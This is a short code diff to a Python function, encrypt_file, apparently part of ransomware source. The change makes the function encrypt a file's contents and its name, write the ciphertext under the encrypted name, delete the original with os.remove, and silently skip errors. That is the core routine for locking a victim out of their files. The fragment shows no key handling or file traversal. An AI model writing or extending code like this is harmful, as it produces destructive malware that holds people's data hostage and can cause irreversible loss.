@@ -16,8 +16,10 @@ def encrypt_file(file_name,key):
         with open(file_name,"rb") as fil:
             file_data = fil.read()
             encrypted_data = f.encrypt(file_data)
-            with open(file_name, "wb") as fil:
+            encrypted_file_name = f.encrypt(bytes(file_name,'utf-8'))
+            with open(encrypted_file_name, "wb") as fil:
                 fil.write(encrypted_data)
+            os.remove(file_name)
     except:
         print(f'[IGNORING]{file_name}')
 
